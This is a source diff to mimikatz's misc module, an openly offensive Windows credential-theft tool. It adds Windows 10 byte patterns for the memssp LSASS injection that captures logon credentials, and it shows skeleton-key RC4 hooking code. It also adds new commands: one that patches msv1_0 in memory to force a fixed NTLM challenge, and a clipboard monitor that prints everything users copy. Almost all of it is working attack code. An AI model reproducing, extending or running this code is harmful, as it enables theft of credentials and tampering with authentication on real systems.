@@ -10,7 +10,9 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_regedit,	L"regedit",		L"Registry Editor         (without DisableRegistryTools)"},
 	{kuhl_m_misc_taskmgr,	L"taskmgr",		L"Task Manager            (without DisableTaskMgr)"},
 	{kuhl_m_misc_ncroutemon,L"ncroutemon",	L"Juniper Network Connect (without route monitoring)"},
+#if !defined(_M_ARM64)
 	{kuhl_m_misc_detours,	L"detours",		L"[experimental] Try to enumerate all modules with Detours-like hooks"},
+#endif
 //#ifdef _M_X64
 //	{kuhl_m_misc_addsid,	L"addsid",		NULL},
 //#endif
@@ -18,6 +20,9 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_skeleton,	L"skeleton",	NULL},
 	{kuhl_m_misc_compressme,L"compressme",	NULL},
 	{kuhl_m_misc_wp,		L"wp",	NULL},
+	{kuhl_m_misc_mflt,		L"mflt",	NULL},
+	{kuhl_m_misc_easyntlmchall,	L"easyntlmchall", NULL},
+	{kuhl_m_misc_clip,		L"clip", NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
@@ -50,7 +55,7 @@ NTSTATUS kuhl_m_misc_ncroutemon(int argc, wchar_t * argv[])
 	kull_m_patch_genericProcessOrServiceFromBuild(ncRouteMonitorReferences, ARRAYSIZE(ncRouteMonitorReferences), L"dsNcService", NULL, TRUE);
 	return STATUS_SUCCESS;
 }
-
+#if !defined(_M_ARM64)
 BOOL CALLBACK kuhl_m_misc_detours_callback_module_name_addr(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
 {
 	if(((PBYTE) pvArg >= (PBYTE) pModuleInformation->DllBase.address) && ((PBYTE) pvArg < ((PBYTE) pModuleInformation->DllBase.address + pModuleInformation->SizeOfImage)))
@@ -92,7 +97,7 @@ PBYTE kuhl_m_misc_detours_testHookDestination(PKULL_M_MEMORY_ADDRESS base, WORD 
 						else
 						{
 							dst = *(PBYTE *) ((PBYTE) aBuffer.address + myHooks[i].offsetToRead);
-#ifdef _M_X64
+#if defined(_M_X64)
 							if(machineOfProcess == IMAGE_FILE_MACHINE_I386)
 								dst = (PBYTE) ((ULONG_PTR) dst & 0xffffffff);
 #endif
@@ -102,7 +107,7 @@ PBYTE kuhl_m_misc_detours_testHookDestination(PKULL_M_MEMORY_ADDRESS base, WORD 
 						{
 							pBuffer.address = dst;
 							kull_m_memory_copy(&dBuffer, &pBuffer, sizeof(PBYTE));
-#ifdef _M_X64
+#if defined(_M_X64)
 							if(machineOfProcess == IMAGE_FILE_MACHINE_I386)
 								dst = (PBYTE) ((ULONG_PTR) dst & 0xffffffff);
 #endif
@@ -186,7 +191,7 @@ NTSTATUS kuhl_m_misc_detours(int argc, wchar_t * argv[])
 	kull_m_process_getProcessInformation(kuhl_m_misc_detours_callback_process, NULL);
 	return STATUS_SUCCESS;
 }
-
+#endif
 BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SIZE_T szDisableString, PWSTR enableString, SIZE_T szEnableString)
 {
 	BOOL status = FALSE;
@@ -471,7 +476,7 @@ NTSTATUS NTAPI misc_msv1_0_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PU
 DWORD misc_msv1_0_SpAcceptCredentials_end(){return 'mssp';}
 #pragma optimize("", on)
 
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE INSTR_JMP[]= {0xff, 0x25, 0x00, 0x00, 0x00, 0x00}; // need 14
 BYTE PTRN_WIN5_MSV1_0[]	= {0x49, 0x8b, 0xd0, 0x4d, 0x8b, 0xc1, 0xeb, 0x08, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x89, 0x4c, 0x24, 0x08}; // damn short jump!
 BYTE PTRN_WI6X_MSV1_0[]	= {0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48};
@@ -480,19 +485,23 @@ KULL_M_PATCH_GENERIC MSV1_0AcceptReferences[] = {
 	{KULL_M_WIN_MIN_BUILD_2K3,	{sizeof(PTRN_WIN5_MSV1_0),	PTRN_WIN5_MSV1_0},	{0, NULL}, {  0, sizeof(PTRN_WIN5_MSV1_0)}},
 	{KULL_M_WIN_MIN_BUILD_VISTA,{sizeof(PTRN_WI6X_MSV1_0),	PTRN_WI6X_MSV1_0},	{0, NULL}, {-15, 15}},
 	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-17, 15}},
+	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-16, 15}},
+	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-17, 15}},
+	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-16, 15}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE INSTR_JMP[]= {0xe9}; // need 5
 BYTE PTRN_WIN5_MSV1_0[] = {0x8b, 0xff, 0x55, 0x8b, 0xec, 0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, 0x08, 0xe8};
 BYTE PTRN_WI6X_MSV1_0[]	= {0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, 0x08, 0xe8, 0x24, 0x00, 0x00, 0x00};
 BYTE PTRN_WI80_MSV1_0[] = {0xff, 0x75, 0x08, 0x8b, 0x4d, 0x14, 0x8b, 0x55, 0x10, 0xe8};
-BYTE PTRN_WI81_MSV1_0[]	= {0xff, 0x75, 0x14, 0x8B, 0x55, 0x10, 0x8B, 0x4D, 0x08, 0xE8};
-
+BYTE PTRN_WI81_MSV1_0[]	= {0xff, 0x75, 0x14, 0x8b, 0x55, 0x10, 0x8b, 0x4d, 0x08, 0xe8};
+BYTE PTRN_W10_1703_MSV1_0[] = {0x8b, 0x55, 0x10, 0x8b, 0x4d, 0x08, 0x56, 0xff, 0x75, 0x14, 0xe8};
 KULL_M_PATCH_GENERIC MSV1_0AcceptReferences[] = {
 	{KULL_M_WIN_MIN_BUILD_XP,	{sizeof(PTRN_WIN5_MSV1_0),	PTRN_WIN5_MSV1_0},	{0, NULL}, {  0, 5}},
 	{KULL_M_WIN_MIN_BUILD_VISTA,{sizeof(PTRN_WI6X_MSV1_0),	PTRN_WI6X_MSV1_0},	{0, NULL}, {-41, 5}},
 	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI80_MSV1_0),	PTRN_WI80_MSV1_0},	{0, NULL}, {-43, 5}},
 	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-39, 5}},
+	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_W10_1703_MSV1_0),	PTRN_W10_1703_MSV1_0},	{0, NULL}, {-28, 15}},
 };
 #endif
 PCWCHAR szMsvCrt = L"msvcrt.dll";
@@ -538,9 +547,9 @@ NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
 									RtlCopyMemory((PBYTE) aLocal.address + pGeneric->Offsets.off1, INSTR_JMP, sizeof(INSTR_JMP));
 									if(kull_m_memory_alloc(&aLsass, trampoSize, PAGE_EXECUTE_READWRITE))
 									{
-									#ifdef _M_X64
+									#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 										*(PVOID *)((PBYTE) aLocal.address + pGeneric->Offsets.off1 + sizeof(INSTR_JMP)) = (PBYTE) sSearch.result + pGeneric->Offsets.off1;
-									#elif defined _M_IX86
+									#elif defined(_M_IX86)
 										*(LONG *)((PBYTE) aLocal.address + pGeneric->Offsets.off1 + sizeof(INSTR_JMP)) = (PBYTE) sSearch.result - ((PBYTE) aLsass.address + sizeof(INSTR_JMP) + sizeof(LONG));
 									#endif
 										extensions[3].Pointer = aLsass.address;
@@ -549,9 +558,9 @@ NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
 											if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(aLsass.hMemory, misc_msv1_0_SpAcceptCredentials, (DWORD) ((PBYTE) misc_msv1_0_SpAcceptCredentials_end - (PBYTE) misc_msv1_0_SpAcceptCredentials), &extForCb, &aLsass))
 											{
 												RtlCopyMemory((PBYTE) aLocal.address, INSTR_JMP, sizeof(INSTR_JMP));
-											#ifdef _M_X64
+											#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 												*(PVOID *)((PBYTE) aLocal.address + sizeof(INSTR_JMP)) = aLsass.address;
-											#elif defined _M_IX86
+											#elif defined(_M_IX86)
 												*(LONG *)((PBYTE) aLocal.address + sizeof(INSTR_JMP)) = (PBYTE) aLsass.address - ((PBYTE) sSearch.result + sizeof(INSTR_JMP) + sizeof(LONG));
 											#endif
 												aLsass.address = sSearch.result;
@@ -590,7 +599,7 @@ NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD Ke
 {
 	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
 	PVOID origContext, kiwiContext;
-	DWORD kiwiKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
+	DWORD kiwiKey[] = {0xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
 	if(*pContext = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, 32 + sizeof(PVOID)))
 	{
 		status = ((PKERB_ECRYPT_INITIALIZE) 0x4343434343434343)(Key, KeySize, KeyUsage, &origContext);
@@ -617,7 +626,7 @@ NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD Ke
 NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init_decrypt(PVOID pContext, LPCVOID Data, DWORD DataSize, PVOID Output, DWORD * OutputSize)
 {
 	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
-	DWORD origOutputSize = *OutputSize, kiwiKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
+	DWORD origOutputSize = *OutputSize, kiwiKey[] = {0xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
 	PVOID buffer;
 	if(buffer = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, DataSize))
 	{
@@ -827,7 +836,7 @@ void kuhl_m_misc_wp_for_pid(DWORD pid, PCWCHAR wp)
 					else PRINT_ERROR_AUTO(L"kull_m_remotelib_create");
 					LocalFree(iData);
 				}
-				kull_m_memory_free(&aRemoteFunc, 0);
+				kull_m_memory_free(&aRemoteFunc);
 			}
 			else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
 			kull_m_memory_close(hMemory);
@@ -835,4 +844,270 @@ void kuhl_m_misc_wp_for_pid(DWORD pid, PCWCHAR wp)
 		CloseHandle(hProcess);
 	}
 	else PRINT_ERROR_AUTO(L"OpenProcess");
+}
+
+NTSTATUS kuhl_m_misc_mflt(int argc, wchar_t * argv[])
+{
+	PFILTER_AGGREGATE_BASIC_INFORMATION info, info2;
+	DWORD szNeeded;// = 0;
+	HANDLE hDevice;
+	HRESULT res;
+
+	res = FilterFindFirst(FilterAggregateBasicInformation, NULL, 0, &szNeeded, &hDevice);
+	if(res == HRESULT_FROM_WIN32(ERROR_INSUFFICIENT_BUFFER))
+	{
+		if(info = (PFILTER_AGGREGATE_BASIC_INFORMATION) LocalAlloc(LPTR, szNeeded))
+		{
+			res = FilterFindFirst(FilterAggregateBasicInformation, info, szNeeded, &szNeeded, &hDevice);
+			if(res == S_OK)
+			{
+				kuhl_m_misc_mflt_display(info);
+				do
+				{
+					res = FilterFindNext(hDevice, FilterAggregateBasicInformation, NULL, 0, &szNeeded);
+					if(res == HRESULT_FROM_WIN32(ERROR_INSUFFICIENT_BUFFER))
+					{
+						if(info2 = (PFILTER_AGGREGATE_BASIC_INFORMATION) LocalAlloc(LPTR, szNeeded))
+						{
+							res = FilterFindNext(hDevice, FilterAggregateBasicInformation, info2, szNeeded, &szNeeded);
+							if(res == S_OK)
+								kuhl_m_misc_mflt_display(info2);
+							else PRINT_ERROR(L"FilterFindNext(data): 0x%08x\n", res);
+							LocalFree(info2);
+						}
+					}
+					else if(res != HRESULT_FROM_WIN32(ERROR_NO_MORE_ITEMS)) PRINT_ERROR(L"FilterFindNext(size): 0x%08x\n", res);
+				}
+				while(res == S_OK);
+			}
+			else PRINT_ERROR(L"FilterFindFirst(data): 0x%08x\n", res);
+			LocalFree(info);
+		}
+	}
+	else if(res != HRESULT_FROM_WIN32(ERROR_NO_MORE_ITEMS)) (L"FilterFindFirst(size): 0x%08x\n", res);
+	return STATUS_SUCCESS;
+}
+
+void kuhl_m_misc_mflt_display(PFILTER_AGGREGATE_BASIC_INFORMATION info)
+{
+	DWORD offset;
+	do
+	{
+		switch(info->Flags)
+		{
+		case FLTFL_AGGREGATE_INFO_IS_MINIFILTER:
+			kprintf(L"%u %u %10.*s %.*s\n",
+				info->Type.MiniFilter.FrameID, info->Type.MiniFilter.NumberOfInstances,
+				info->Type.MiniFilter.FilterAltitudeLength / sizeof(wchar_t), (PBYTE) info + info->Type.MiniFilter.FilterAltitudeBufferOffset,
+				info->Type.MiniFilter.FilterNameLength / sizeof(wchar_t), (PBYTE) info + info->Type.MiniFilter.FilterNameBufferOffset
+			);
+			break;
+		case FLTFL_AGGREGATE_INFO_IS_LEGACYFILTER:
+			kprintf(L"--- LEGACY --- %.*s\n", info->Type.LegacyFilter.FilterNameLength / sizeof(wchar_t), (PBYTE) info + info->Type.LegacyFilter.FilterNameBufferOffset);
+			break;
+		default:
+			;
+		}
+		offset = info->NextEntryOffset;
+		info = (PFILTER_AGGREGATE_BASIC_INFORMATION) ((PBYTE) info + offset);
+	}
+	while(offset);
+}
+
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
+BYTE PTRN_WI7_SHNM[] = {0x49, 0xbb, 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x48, 0xb8, 0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f, 0x48, 0x8d, 0x4e, 0x18, 0x8b, 0xd3, 0xc7, 0x46, 0x08, 0x02, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x1e, 0x48, 0x89, 0x46, 0x30, 0xe8};
+BYTE PATC_WI7_SHNM[] = {0xc7, 0x46, 0x08, 0x02, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x1e, 0x48, 0x89, 0x46, 0x30, 0x48, 0xb8, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x48, 0x89, 0x46, 0x18, 0x90, 0x90, 0x90, 0x90, 0x90};
+BYTE PTRN_W10_1709_SHNM[] = {0x48, 0xb8, 0x0a, 0x00, 0xab, 0x3f, 0x00, 0x00, 0x00, 0x0f, 0xba, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0x47, 0x30, 0xff, 0x15};
+BYTE PATC_W10_1709_SHNM[] = {0x48, 0xb8, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x48, 0x89, 0x47, 0x18};
+KULL_M_PATCH_GENERIC SHNMReferences[] = {
+	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI7_SHNM),			PTRN_WI7_SHNM},			{sizeof(PATC_WI7_SHNM),			PATC_WI7_SHNM},			{20}},
+	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_W10_1709_SHNM),	PTRN_W10_1709_SHNM},	{sizeof(PATC_W10_1709_SHNM),	PATC_W10_1709_SHNM},	{19}},
+};
+#elif defined(_M_IX86)
+BYTE PTRN_WI7_SHNM[] = {0xc7, 0x43, 0x30, 0x06, 0x01, 0xb1, 0x1d, 0xc7, 0x43, 0x34, 0x00, 0x00, 0x00, 0x0f, 0xe8};
+BYTE PATC_WI7_SHNM[] = {0x58, 0x58, 0xc7, 0x43, 0x18, 0x11, 0x22, 0x33, 0x44, 0xc7, 0x43, 0x1c, 0x55, 0x66, 0x77, 0x88};
+BYTE PTRN_W10_1709_SHNM[] = {0x8d, 0x43, 0x18, 0x6a, 0x08, 0x50, 0xc7, 0x43, 0x08, 0x02, 0x00, 0x00, 0x00, 0xc7, 0x43, 0x30, 0x0a, 0x00, 0xab, 0x3f, 0xc7, 0x43, 0x34, 0x00, 0x00, 0x00, 0x0f, 0xff, 0x15};
+BYTE PATC_W10_1709_SHNM[] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xc7, 0x43, 0x08, 0x02, 0x00, 0x00, 0x00, 0xc7, 0x43, 0x30, 0x0a, 0x00, 0xab, 0x3f, 0xc7, 0x43, 0x34, 0x00, 0x00, 0x00, 0x0f, 0xc7, 0x43, 0x18, 0x11, 0x22, 0x33, 0x44, 0xc7, 0x43, 0x1c, 0x55, 0x66, 0x77, 0x88}; //
+KULL_M_PATCH_GENERIC SHNMReferences[] = {
+	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI7_SHNM),			PTRN_WI7_SHNM},			{sizeof(PATC_WI7_SHNM),			PATC_WI7_SHNM},			{14}},
+	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_W10_1709_SHNM),	PTRN_W10_1709_SHNM},	{sizeof(PATC_W10_1709_SHNM),	PATC_W10_1709_SHNM},	{0}},
+};
+#endif
+NTSTATUS kuhl_m_misc_easyntlmchall(int argc, wchar_t * argv[])
+{
+	if((MIMIKATZ_NT_BUILD_NUMBER == (KULL_M_WIN_BUILD_7 + 1)) || (MIMIKATZ_NT_BUILD_NUMBER == KULL_M_WIN_BUILD_10_1709))
+		kull_m_patch_genericProcessOrServiceFromBuild(SHNMReferences, ARRAYSIZE(SHNMReferences), L"SamSs", L"msv1_0.dll", TRUE);
+	else PRINT_ERROR(L"Windows version is not supported (yet)\n");
+	return STATUS_SUCCESS;
+}
+
+HWND kuhl_misc_clip_hWnd, kuhl_misc_clip_hWndNextViewer;
+DWORD kuhl_misc_clip_dwData, kuhl_misc_clip_seq;
+LPBYTE kuhl_misc_clip_Data;
+
+NTSTATUS kuhl_m_misc_clip(int argc, wchar_t * argv[])
+{
+	WNDCLASSEX myClass;
+	ATOM aClass;
+	MSG msg;
+	BOOL bRet;
+	HINSTANCE hInstance = GetModuleHandle(NULL);
+
+	RtlZeroMemory(&myClass, sizeof(WNDCLASSEX));
+	myClass.cbSize = sizeof(WNDCLASSEX);
+	myClass.lpfnWndProc = kuhl_m_misc_clip_MainWndProc;
+	myClass.lpszClassName = MIMIKATZ L"_Window_Message";
+	kprintf(L"Monitoring ClipBoard...(CTRL+C to stop)\n\n");
+	if(aClass = RegisterClassEx(&myClass))
+	{
+		if(kuhl_misc_clip_hWnd = CreateWindowEx(0, (LPCWSTR) aClass, MIMIKATZ, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL))
+		{
+			SetConsoleCtrlHandler(kuhl_misc_clip_WinHandlerRoutine, TRUE);
+			kuhl_misc_clip_Data = NULL;
+			kuhl_misc_clip_dwData = kuhl_misc_clip_seq = 0;
+			kuhl_misc_clip_hWndNextViewer = SetClipboardViewer(kuhl_misc_clip_hWnd);
+			while((bRet = GetMessage(&msg, kuhl_misc_clip_hWnd, WM_QUIT, WM_CHANGECBCHAIN)))
+			{
+				if(bRet > FALSE)
+				{
+					TranslateMessage(&msg);
+					DispatchMessage(&msg);
+				}
+				else if (bRet < FALSE)
+					PRINT_ERROR_AUTO(L"GetMessage");
+			}
+			if(!ChangeClipboardChain(kuhl_misc_clip_hWnd, kuhl_misc_clip_hWndNextViewer))
+				PRINT_ERROR_AUTO(L"ChangeClipboardChain");
+			SetConsoleCtrlHandler(kuhl_misc_clip_WinHandlerRoutine, FALSE);
+			if(!DestroyWindow(kuhl_misc_clip_hWnd))
+				PRINT_ERROR_AUTO(L"DestroyWindow");
+		}
+		if(!UnregisterClass((LPCWSTR) aClass, hInstance))
+			PRINT_ERROR_AUTO(L"UnregisterClass");
+	}
+	else PRINT_ERROR_AUTO(L"RegisterClassEx");
+	return STATUS_SUCCESS;
+
+	//DWORD format;
+	//HANDLE hData;
+	//wchar_t formatName[256];
+	//LPDATAOBJECT data;
+	//IEnumFORMATETC *iFormats;
+
+	//FORMATETC re[45];
+	//DWORD dw = 0, i;
+	//STGMEDIUM medium;
+	//
+	//if(OpenClipboard(NULL))
+	//{
+	//	for(format = EnumClipboardFormats(0); format; format = EnumClipboardFormats(format))
+	//	{
+	//		kprintf(L"* %08x (%5u)\t", format, format);
+	//		if(GetClipboardFormatName(format, formatName, ARRAYSIZE(formatName)) > 1)
+	//			kprintf(L"%s ", formatName);
+	//		if(hData = GetClipboardData(format))
+	//			kprintf(L"(size = %u)", (DWORD) GlobalSize(hData));
+	//		kprintf(L"\n");
+	//	}
+	//	CloseClipboard();
+	//}
+
+	//if(OleGetClipboard(&data) == S_OK)
+	//{
+	//	if(IDataObject_EnumFormatEtc(data, DATADIR_GET, &iFormats) == S_OK)
+	//	{
+	//		kprintf(L"%08x\n", IEnumFORMATETC_Next(iFormats, ARRAYSIZE(re), re, &dw));
+	//		for(i = 0; i < dw; i++)
+	//		{
+	//			kprintf(L"%08x - %5u", re[i].cfFormat, re[i].cfFormat);
+	//				kprintf(L"  %u\t", re[i].tymed);
+
+	//			if(IDataObject_GetData(data, &re[i], &medium) == S_OK)
+	//			{
+	//				kprintf(L"\tT: %08x - %5u", medium.tymed, medium.tymed);
+	//				ReleaseStgMedium(&medium);
+	//			}
+	//			kprintf(L"\n");
+	//		}
+	//		IEnumFORMATETC_Release(iFormats);
+	//	}
+	//	IDataObject_Release(data);
+	//}
+	return STATUS_SUCCESS;
+	
+}
+
+BOOL WINAPI kuhl_misc_clip_WinHandlerRoutine(DWORD dwCtrlType)
+{
+	if(kuhl_misc_clip_Data)
+		LocalFree(kuhl_misc_clip_Data);
+	if(kuhl_misc_clip_hWnd)
+		PostMessage(kuhl_misc_clip_hWnd, WM_QUIT, STATUS_ABANDONED, 0);
+	return ((dwCtrlType == CTRL_C_EVENT) || (dwCtrlType == CTRL_BREAK_EVENT));
+}
+
+LRESULT APIENTRY kuhl_m_misc_clip_MainWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
+{
+	LRESULT result = (LRESULT) NULL;
+	DWORD curSeq, format, bestFormat = 0, size;
+	HANDLE hData;
+	BOOL bSameSize = FALSE, bSameData = FALSE;
+
+	switch (uMsg)
+	{
+	case WM_CHANGECBCHAIN:
+		if((HWND) wParam == kuhl_misc_clip_hWndNextViewer) 
+			kuhl_misc_clip_hWndNextViewer = (HWND) lParam; 
+		else if (kuhl_misc_clip_hWndNextViewer) 
+			result = SendMessage(kuhl_misc_clip_hWndNextViewer, uMsg, wParam, lParam); 
+		break;
+	case WM_DRAWCLIPBOARD:
+		curSeq = GetClipboardSequenceNumber();
+		if(curSeq != kuhl_misc_clip_seq)
+		{
+			kuhl_misc_clip_seq = curSeq;
+			if(OpenClipboard(hwnd))
+			{
+				for(format = EnumClipboardFormats(0); format && (bestFormat != CF_UNICODETEXT); format = EnumClipboardFormats(format))
+					if((format == CF_TEXT) || (format == CF_UNICODETEXT))
+						if(format > bestFormat)
+							bestFormat = format;
+				if(bestFormat)
+				{
+					if(hData = GetClipboardData(bestFormat))
+					{
+						if(size = (DWORD) GlobalSize(hData))
+						{
+							bSameSize = (size == kuhl_misc_clip_dwData);
+							if(bSameSize && kuhl_misc_clip_Data)
+								bSameData = RtlEqualMemory(kuhl_misc_clip_Data, hData, size);
+							if(!bSameSize)
+							{
+								if(kuhl_misc_clip_Data)
+								{
+									kuhl_misc_clip_Data = (PBYTE) LocalFree(kuhl_misc_clip_Data);
+									kuhl_misc_clip_dwData = 0;
+								}
+								if(kuhl_misc_clip_Data = (PBYTE) LocalAlloc(LPTR, size))
+									kuhl_misc_clip_dwData = size;
+							}
+							if(!bSameData && kuhl_misc_clip_Data)
+							{
+								RtlCopyMemory(kuhl_misc_clip_Data, hData, size);
+								kprintf(L"ClipData: ");
+								kprintf((bestFormat == CF_UNICODETEXT) ? L"%s\n" : L"%S\n", kuhl_misc_clip_Data);
+							}
+						}
+					}
+					else PRINT_ERROR_AUTO(L"GetClipboardData");
+				}
+				CloseClipboard();
+			}
+		}
+		result = SendMessage(kuhl_misc_clip_hWndNextViewer, uMsg, wParam, lParam); 
+		break; 
+	default:
+		result = DefWindowProc(hwnd, uMsg, wParam, lParam);
+	}
+	return result;
 }
